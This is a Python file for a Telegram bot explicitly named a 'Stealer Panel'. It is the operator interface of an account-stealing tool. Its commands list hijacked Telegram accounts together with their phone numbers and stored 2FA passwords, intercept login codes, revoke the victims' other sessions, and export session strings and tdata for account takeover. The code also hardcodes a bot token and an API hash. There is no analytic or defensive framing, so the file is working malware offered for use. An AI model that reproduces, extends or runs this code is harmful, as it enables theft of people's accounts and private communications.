# -*- coding: utf-8 -*-
import asyncio, json
from pyrogram import Client, filters
from pyrogram.enums import ParseMode

BOT_TOKEN = "8876857172:AAHtfNZy4YLe8XAE9ZIpnYMkjImdJjjppyU"
_bot = None
_selected = {}

def _init_bot():
    global _bot
    if _bot is None:
        _bot = Client("stealer_bot", api_id=2040, api_hash="b18441a1ff607e10a989891a5462e627",
                     bot_token=BOT_TOKEN, in_memory=True)
        _register_handlers()
    return _bot

def _register_handlers():
    @_bot.on_message(filters.command("start") & filters.private)
    async def cmd_start(c, m):
        await m.reply("🔐 <b>Stealer Panel</b>\n\n/list — аккаунты\n/select <id> — выбрать\n"
                      "/kill [id] — отозвать\n/getcode [id] — перехват кода\n"
                      "/session <id> — сессии", parse_mode=ParseMode.HTML)

    @_bot.on_message(filters.command("list") & filters.private)
    async def cmd_list(c, m):
        import stealer_core
        accs = stealer_core.get_all_accounts()
        if not accs:
            return await m.reply("📋 Пусто.")
        lines = ["📋 <b>Аккаунты (%d):</b>\n" % len(accs)]
        for a in accs:
            u = ("@%s" % a["username"]) if a["username"] else "—"
            lines.append(f"<code>{a['id']}</code> │ {a['phone'] or '?'} │ {a['first_name'] or '—'} │ {u} │ 2FA:{'✅' if a['password_2fa'] else '❌'}")
        await m.reply("\n".join(lines), parse_mode=ParseMode.HTML)

    @_bot.on_message(filters.command("select") & filters.private)
    async def cmd_select(c, m):
        import stealer_core
        parts = m.text.split()
        if len(parts) < 2:
            return await m.reply("/select <id>")
        try:
            aid = int(parts[1])
        except:
            return await m.reply("ID — число.")
        acc = stealer_core.get_account_by_id(aid)
        if not acc:
            return await m.reply("Не найден.")
        _selected[m.from_user.id] = aid
        u = ("@%s" % acc["username"]) if acc["username"] else "—"
        await m.reply(f"✅ Выбран:\nID: <code>{acc['id']}</code>\n📱 {acc['phone'] or '—'}\n"
                      f"👤 {acc['first_name'] or '—'}\n🔗 {u}\n🆔 <code>{acc['tg_id']}</code>\n"
                      f"🔐 2FA: {'✅ '+acc['password_2fa'] if acc['password_2fa'] else '❌'}",
                      parse_mode=ParseMode.HTML)

    @_bot.on_message(filters.command("kill") & filters.private)
    async def cmd_kill(c, m):
        import stealer_core
        parts = m.text.split()
        aid = None
        if len(parts) >= 2:
            try:
                aid = int(parts[1])
            except:
                return await m.reply("ID — число.")
        st = await m.reply("⏳ Отзываем...")
        killed = await stealer_core.kill_sessions_async(aid)
        if not killed:
            await st.edit_text("❌ Нечего отзывать.")
        else:
            await st.edit_text("✅ <b>Отозвано:</b>\n" + "\n".join("• %s" % k for k in killed), parse_mode=ParseMode.HTML)

    @_bot.on_message(filters.command("getcode") & filters.private)
    async def cmd_getcode(c, m):
        import stealer_core
        aid = _selected.get(m.from_user.id)
        parts = m.text.split()
        if len(parts) >= 2:
            try:
                aid = int(parts[1])
            except:
                pass
        if not aid:
            return await m.reply("Сначала: /select <id>")
        acc = stealer_core.get_account_by_id(aid)
        if not acc:
            return await m.reply("Не найден.")
        phone = acc["phone"]
        app = await stealer_core.start_interceptor(aid)
        if not app:
            return await m.reply("❌ Не подключился.")
        st = await m.reply(f"🔍 <b>Перехват активен</b>\n📱 {phone}\n\nОжидаю код (2 мин)...", parse_mode=ParseMode.HTML)
        code = await stealer_core.wait_for_code(phone, timeout=120)
        await stealer_core.stop_interceptor(phone)
        if code:
            await st.edit_text(f"🔑 <b>КОД:</b> <code>{code}</code>\n📱 {phone}", parse_mode=ParseMode.HTML)
        else:
            await st.edit_text(f"⏰ Таймаут — код не пришёл.", parse_mode=ParseMode.HTML)

    @_bot.on_message(filters.command("session") & filters.private)
    async def cmd_session(c, m):
        import stealer_core
        parts = m.text.split()
        if len(parts) < 2:
            return await m.reply("/session <id>")
        try:
            aid = int(parts[1])
        except:
            return await m.reply("ID — число.")
        acc = stealer_core.get_account_by_id(aid)
        if not acc:
            return await m.reply("Не найден.")
        st = await m.reply("⏳ Экспортирую...")
        ss, tdata = await stealer_core.export_sessions(aid)
        if not ss:
            return await st.edit_text("❌ Сессия мертва.")
        p1 = f"📦 <b>#{aid}</b>\n📱 {acc['phone'] or '—'}\n👤 {(acc['first_name'] or '—')}\n\n<b>Pyrogram:</b>\n<code>{ss}</code>"
        await st.edit_text(p1, parse_mode=ParseMode.HTML)
        if tdata:
            await m.reply("<b>Telethon тдата:</b>\n<code>%s</code>" % json.dumps(tdata, ensure_ascii=False), parse_mode=ParseMode.HTML)

def run_stealer_bot():
    import stealer_core
    stealer_core.init_db()
    bot = _init_bot()
    print("[stealer_bot] Запуск...")
    bot.run()
